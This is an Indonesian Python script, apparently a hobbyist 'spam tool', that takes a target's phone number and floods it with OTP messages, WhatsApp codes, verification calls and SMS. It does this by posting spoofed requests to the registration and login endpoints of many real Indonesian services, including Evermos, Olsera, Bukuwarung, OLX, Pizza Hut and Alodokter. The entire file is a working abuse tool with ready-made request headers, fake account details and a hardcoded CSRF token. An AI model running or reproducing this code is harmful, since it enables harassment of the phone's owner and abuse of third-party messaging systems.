import os,sys,time,requests,json
from colorama import init,Fore,Back

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"


def countdown(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Meluncurkan Roket Dalam \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(2)
			time_sec -= 1
		print (f"{W}[{R}•{W}] Sending Spam{abu}....              ")
		time.sleep(5)
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")

def down(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Memulai Dalam \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(2)
			time_sec -= 1
		print (f"")
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")

def subrek():
	os.system("clear")
	print (f"{biru}Subscribe Channel {W}Aing Dulu Sluur {biru}^_^...")
	os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
	time.sleep(5)
	print (f"{biru}Subscribe Channel Ke dua{W}Aing Juga Sluur {biru}^_^...")
	os.system("xdg-open https://youtube.com/channel/UCyyIDnXYJlRI_-2pAQqKr0g")
	down(5)
	logo()

def logo():
	ip=requests.get('https://api.ipify.org').text
	os.system("clear")
	print (f"""
{biru}╔═╗{W}┬┌┬┐┌─┐┬  ┌─┐ {biru}╔═╗{Y}╔═╗{G}╦ ╦ {W}[{Y}•{W}] \033[4;90mCreated By\033[1;0m
{biru}╚═╗{W}││││├─┘│  ├┤  {biru}╚═╗{Y}║  {G}║║║ {W}[{Y}•{W}] \033[4;90mExecuted Team\033[1;0m
{biru}╚═╝{W}┴┴ ┴┴  ┴─┘└─┘ {biru}╚═╝{Y}╚═╝{G}╚╩╝ {W}[{Y}•{W}] \033[4;90m©AmmarBN\033[1;0m
\033[4;97m---------------------------------------------\033[1;0m

{W}[{R}»⟩{W}] Your Ip {R}: \033[4;93m{ip}\033[1;0m
{W}[{R}»⟩{W}] Creator {R}:{W} Ammar-Executed
{W}[{R}»⟩{W}] Youtube {R}:{W} Ammar Executed
{W}[{R}»⟩{W}] Github  {R}: \033[4;92mhttps://github.com/AmmarrBN\033[1;0m
{W}[{R}»⟩{W}] Notice  {R}: \033[4;93mJika Eror/Coid Tunggu beberapa Menit Dan Coba Lagi\033[1;0m""")
	print (f"""
	{biru}«{ungu}⟨{W}1{R}.{W}Spam {G}W{W}hatsapl{ungu}⟩{biru}»
	{biru}«{ungu}⟨{W}2{R}.{W}Spam {Y}C{W}all{ungu}⟩{biru}»
	{biru}«{ungu}⟨{W}3{R}.{W}Spam {biru}S{W}ms{ungu}⟩{biru}»
	{biru}«{ungu}⟨{W}4{R}.{W}Laporkan {R}B{W}ug{ungu}⟩{biru}»
	{biru}«{ungu}⟨{W}5{R}.{R}E{W}xit Tools{ungu}⟩{biru}»
	""")
	a=input(f"{W}[\033[4;96m?\033[1;0m{W}] Input Menu {R}:{W} ")
	if a == "1":
		wa1()
	if a == "2":
		cal1()
	if a == "3":
		sms1()
	if a == "4":
		bug1()
	if a == "5":
		print (f"{W}[{R}•{W}] Exiting Tools.....")
		time.sleep(4)
	if a == "":
		print (f"{W}[{R}•{W}] Masukkan Dengan Benar {R}!!")
	if a == " ":
		print (f"{W}[{R}•{W}] Masukkan Dengan Benar {R}!!")

def wa1():
	nomor=input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Number {R}:{W} ")
	jum=int(input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Jumlah (Max:,{biru}5{W}){R}:{W}"))
	for i in range(int(jum)):
		countdown(10)
		heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		ammarganz=json.dumps({"phone":"62"+nomor})
		req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text
		if "success" in req:
			print (f"{W}[{G}✓{W}] Sukses Spam Evermos")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Evermos")

		ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})
		ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text
		if "Registration succes." in ol3:
			print (f"{W}[{G}✓{W}] Sukses Spam Olsera")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Olsera")
	
		ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
		data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
		req1=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
		print (f"{W}[{G}✓{W}] Sukses Spam Sampingan")
	
		tes=requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
		if "status" in tes:
			print (f"{W}[{G}✓{W}] Sukses Spam Bukuwarung")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Bukuwarung")
	
		shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
		shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
		shope=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
		if "errors" in shope:
			print (f"{W}[{R}❌{W}] Gagal Spam LummoShop")
		else:
			print (f"{W}[{G}✓{W}] Sukses Spam LummoShop")

def cal1():
	nomor=input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Number {R}:{W} ")
	jum=int(input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Jumlah (Max:,{biru}5{W}){R}:{W}"))
	for i in range(int(jum)):
		countdown(15)
		head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		dat=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})
		pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text
		if "Registration succes." in pos:
			print (f"{W}[{G}✓{W}] Sukses Spam Call")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Call")

		he={"Host":"id.jagreward.com","Connection":"keep-alive","Accept":"*/*","X-Requested-With":"XMLHttpRequest","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		post=requests.get("https://id.jagreward.com/member/verify-mobile/"+nomor+"/",headers=he).text
		if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in post:
			print (f"{W}[{G}✓{W}] Sukses Spam Call")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Call")

def sms1():
	nomor=input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Number {R}:{W} ")
	jum=int(input(f"{W}[\033[4;96m»\033[1;0m{W}] Input Jumlah (Max:,{biru}5{W}){R}:{W}"))
	for i in range(int(jum)):
		countdown(8)
		AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
		if "PENDING" in AmmarGanz:
			print (f"{W}[{G}✓{W}] Sukses Spam Olx")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Olx")

		AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
		wkwk=json.dumps({"account":nomor})
		req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
		if "Too Early" in req:
			print (f"{W}[{R}❌{W}] Gagal Spam Mapclub")
		else:
			print (f"{W}[{G}✓{W}] Sukses Spam Mapclub")

		pizza={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
		pizza2=json.dumps({  "email": "margeng84@gmail.com",  "first_name": "Gengbeng",  "last_name": "WokLay",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})
		pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=pizza,data=pizza2).text
		if "errors" in pizzahut:
			print (f"{W}[{R}❌{W}] Gagal Spam Pizzahut")
		else:
			print (f"{W}[{G}✓{W}] Sukses Spam Pizzahut")

		xen6={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
		xen7=json.dumps({"user": {"phone": "0"+nomor}})
		req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text
		if "Kami telah mengirim kode verifikasi. Masukkan kode tersebut untuk verifikasi." in req3:
			print (f"{W}[{G}✓{W}] Sukses Spam Alodokter")
		else:
			print (f"{W}[{R}❌{W}] Gagal Spam Alodokter")

def bug1():
	print (f"{W}[{R}»⟩{W}] Note  {R}: \033[4;92mGunakan Tanda + Untuk Space/Spasi\033[1;0m")
	print (f"{W}[{R}»⟩{W}]       {R}  \033[4;92mContoh:Halo+Bang\033[1;0m")
	b = input(f"{W}[{R}!\033[1;0m{W}] Report {R}:\033[4;92m ")
	os.system(f"xdg-open https://wa.me/6288229683561?text={b}")
	print (f"{W}[{R}•{W}] Laporan Telah Tersampaikan {G}✓")

subrek()
